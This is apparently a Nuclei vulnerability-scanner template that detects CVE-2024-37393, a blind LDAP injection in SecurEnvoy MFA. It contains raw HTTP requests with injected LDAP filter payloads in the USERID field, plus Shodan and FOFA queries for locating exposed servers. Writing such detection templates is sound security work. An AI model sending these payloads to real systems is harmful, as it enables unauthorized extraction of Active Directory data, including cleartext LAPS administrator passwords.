http:
- matchers:
  - condition: and
    dsl:
    - contains(body_1, 'Error checking Group')
    - status_code_1 == 200
    - contains(body_2, 'GETPASSCODE')
    - status_code_2 == 200
    type: dsl
  raw:
  - 'POST /secserver/? HTTP/1.1

    Host: {{Hostname}}


    FLAG=DESKTOP

    1

    STATUS:INIT

    USERID:{{userid}})(sAMAccountName=*

    MEMBEROF:Domain Users

    '
  - 'POST /secserver/? HTTP/1.1

    Host: {{Hostname}}


    FLAG=DESKTOP

    1

    STATUS:INIT

    USERID:*)(sAMAccountName=*

    MEMBEROF:Domain Users

    '
id: CVE-2024-37393
info:
  author: s4e-io
  classification:
    epss-percentile: 0.9918
    epss-score: 0.82327
  description: 'Multiple LDAP injections vulnerabilities exist in SecurEnvoy MFA before
    9.4.514 due to improper validation of user-supplied input. An unauthenticated
    remote attacker could exfiltrate data from Active Directory through blind LDAP
    injection attacks against the DESKTOP service exposed on the /secserver HTTP endpoint.
    This may include ms-Mcs-AdmPwd, which has a cleartext password for the Local Administrator
    Password Solution (LAPS) feature.

    '
  impact: 'Unauthenticated attackers can exploit LDAP injection to exfiltrate sensitive
    Active Directory data including cleartext LAPS passwords.

    '
  metadata:
    fofa-query: title="SecurEnvoy"
    shodan-query: title:"SecurEnvoy"
    verified: true
  name: SecurEnvoy Two Factor Authentication - LDAP Injection
  reference:
  - https://www.tenable.com/cve/CVE-2024-37393
  - https://www.optistream.io/blogs/tech/securenvoy-cve-2024-37393
  - https://securenvoy.com
  remediation: 'Update SecurEnvoy MFA to version 9.4.514 or later.

    '
  severity: critical
  tags: cve,cve2024,securenvoy,ldap,vuln,vkev
variables:
  userid: '{{to_lower(rand_base(20))}}'
